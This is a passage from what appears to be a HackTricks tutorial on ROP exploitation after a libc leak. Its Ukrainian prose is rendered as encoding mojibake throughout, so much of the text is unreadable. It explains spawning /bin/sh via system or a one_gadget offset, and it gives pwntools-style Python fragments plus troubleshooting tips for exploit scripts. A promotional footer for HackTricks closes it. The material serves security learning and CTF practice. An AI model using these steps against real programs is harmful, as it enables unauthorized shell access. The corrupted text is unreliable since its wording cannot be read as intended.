_"/bin/sh"_ –±—É–¥–µ –ø–µ—Ä–µ–¥–∞–Ω–∞ —è–∫ –ø–∞—Ä–∞–º–µ—Ç—Ä.\
–ù–∞—Ä–µ—à—Ç—ñ, **–≤–∏–∫–ª–∏–∫–∞—î—Ç—å—Å—è –∞–¥—Ä–µ—Å–∞ —Ñ—É–Ω–∫—Ü—ñ—ó –≤–∏—Ö–æ–¥—É**, —â–æ–± –ø—Ä–æ—Ü–µ—Å **–∫–æ—Ä–µ–∫—Ç–Ω–æ –∑–∞–≤–µ—Ä—à–∏–≤—Å—è** —ñ –Ω–µ –±—É–ª–æ —Å—Ç–≤–æ—Ä–µ–Ω–æ –∂–æ–¥–Ω–æ–≥–æ —Å–ø–æ–≤—ñ—â–µ–Ω–Ω—è.

**–¢–∞–∫–∏–º —á–∏–Ω–æ–º, –µ–∫—Å–ø–ª–æ–π—Ç –≤–∏–∫–æ–Ω–∞—î –æ–±–æ–ª–æ–Ω–∫—É **_**/bin/sh**_**.**

![](<../../../.gitbook/assets/image (143).png>)

# 4(2)- –í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è ONE\_GADGET

–í–∏ —Ç–∞–∫–æ–∂ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ [**ONE\_GADGET** ](https://github.com/david942j/one\_gadget), —â–æ–± –æ—Ç—Ä–∏–º–∞—Ç–∏ –æ–±–æ–ª–æ–Ω–∫—É –∑–∞–º—ñ—Å—Ç—å –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è **system** —Ç–∞ **"/bin/sh". ONE\_GADGET** –∑–Ω–∞–π–¥–µ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∏ libc —è–∫–∏–π—Å—å —Å–ø–æ—Å—ñ–± –æ—Ç—Ä–∏–º–∞—Ç–∏ –æ–±–æ–ª–æ–Ω–∫—É, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –ª–∏—à–µ –æ–¥–Ω—É **–∞–¥—Ä–µ—Å—É ROP**. \
–û–¥–Ω–∞–∫, –∑–∞–∑–≤–∏—á–∞–π —î –¥–µ—è–∫—ñ –æ–±–º–µ–∂–µ–Ω–Ω—è, –Ω–∞–π–ø–æ—à–∏—Ä–µ–Ω—ñ—à—ñ —Ç–∞ –ª–µ–≥–∫—ñ –¥–ª—è —É–Ω–∏–∫–Ω–µ–Ω–Ω—è, —Ç–∞–∫—ñ —è–∫ `[rsp+0x30] == NULL`. –û—Å–∫—ñ–ª—å–∫–∏ –≤–∏ –∫–æ–Ω—Ç—Ä–æ–ª—é—î—Ç–µ –∑–Ω–∞—á–µ–Ω–Ω—è –≤ **RSP**, –≤–∞–º –ø—Ä–æ—Å—Ç–æ –ø–æ—Ç—Ä—ñ–±–Ω–æ –≤—ñ–¥–ø—Ä–∞–≤–∏—Ç–∏ —â–µ –¥–µ—è–∫—ñ –∑–Ω–∞—á–µ–Ω–Ω—è NULL, —â–æ–± —É–Ω–∏–∫–Ω—É—Ç–∏ –æ–±–º–µ–∂–µ–Ω–Ω—è.

![](<../../../.gitbook/assets/image (615).png>)
```python
ONE_GADGET = libc.address + 0x4526a
rop2 = base + p64(ONE_GADGET) + "\x00"*100
```
# –í–ò–ö–û–†–ò–°–¢–ê–ù–ù–Ø –§–ê–ô–õ–£

–í–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ —à–∞–±–ª–æ–Ω –¥–ª—è –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è —Ü—ñ—î—ó –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ —Ç—É—Ç:

{% content-ref url="rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-template.md)
{% endcontent-ref %}

# –ó–ê–ì–ê–õ–¨–ù–Ü –ü–†–û–ë–õ–ï–ú–ò

## MAIN\_PLT = elf.symbols\['main'] –Ω–µ –∑–Ω–∞–π–¥–µ–Ω–æ

–Ø–∫—â–æ —Å–∏–º–≤–æ–ª "main" –Ω–µ —ñ—Å–Ω—É—î. –¢–æ–¥—ñ –≤–∏ –º–æ–∂–µ—Ç–µ –ø—Ä–æ—Å—Ç–æ –¥–µ –∑–Ω–∞—Ö–æ–¥–∏—Ç—å—Å—è –æ—Å–Ω–æ–≤–Ω–∏–π –∫–æ–¥:
```python
objdump -d vuln_binary | grep "\.text"
Disassembly of section .text:
0000000000401080 <.text>:
```
—ñ –≤—Å—Ç–∞–Ω–æ–≤–∏—Ç–∏ –∞–¥—Ä–µ—Å—É –≤—Ä—É—á–Ω—É:
```python
MAIN_PLT = 0x401080
```
## Puts –Ω–µ –∑–Ω–∞–π–¥–µ–Ω–æ

–Ø–∫—â–æ –±—ñ–Ω–∞—Ä–Ω–∏–π —Ñ–∞–π–ª –Ω–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î Puts, –≤–∞–º —Å–ª—ñ–¥ –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏, —á–∏ –≤—ñ–Ω –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î

## `sh: 1: %s%s%s%s%s%s%s%s: not found`

–Ø–∫—â–æ –≤–∏ –∑–Ω–∞–π–¥–µ—Ç–µ —Ü—é **–ø–æ–º–∏–ª–∫—É** –ø—ñ—Å–ª—è —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è **–≤—Å—ñ—Ö** –µ–∫—Å–ø–ª–æ–π—Ç—ñ–≤: `sh: 1: %s%s%s%s%s%s%s%s: not found`

–°–ø—Ä–æ–±—É–π—Ç–µ **–≤—ñ–¥–Ω—è—Ç–∏ 64 –±–∞–π—Ç–∏ –≤—ñ–¥ –∞–¥—Ä–µ—Å–∏ "/bin/sh"**:
```python
BINSH = next(libc.search("/bin/sh")) - 64
```
<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

–Ü–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ HackTricks:

* –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ –≤–∞—à—É **–∫–æ–º–ø–∞–Ω—ñ—é —Ä–µ–∫–ª–∞–º–æ–≤–∞–Ω—É –Ω–∞ HackTricks** –∞–±–æ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É —Ñ–æ—Ä–º–∞—Ç—ñ PDF**, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks –º–µ—Ä—á**](https://peass.creator-spring.com)
* –í—ñ–¥–∫—Ä–∏–π—Ç–µ –¥–ª—è —Å–µ–±–µ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ Telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –Ω–∞ **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) **—ñ** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **—Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ GitHub**.

</details>
